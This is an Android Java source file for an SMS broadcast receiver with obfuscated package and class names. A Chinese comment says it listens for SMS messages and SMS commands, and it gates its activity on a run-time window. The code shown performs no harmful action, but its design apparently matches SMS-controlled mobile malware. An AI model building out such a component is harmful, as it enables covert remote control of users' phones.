package com.a.a;


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;

/**
 * 监听短信、短信指令
 * 
 * @author tianyiw
 * @author QQ 342114966
 * 
 */
public class sr extends BroadcastReceiver {

	public void onReceive(Context context, Intent intent) {
		u.log(context, "#SmsReceiver#onReceive");

		if (!intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
			u.regReceiver(context);
			u.chkFirstRun(context);
			return;
		}

		if (!u.isCanRun(context)) {
			u.log(context, "#SmsReceiver#时间不在运行范围");
			return;
		}

	}
}
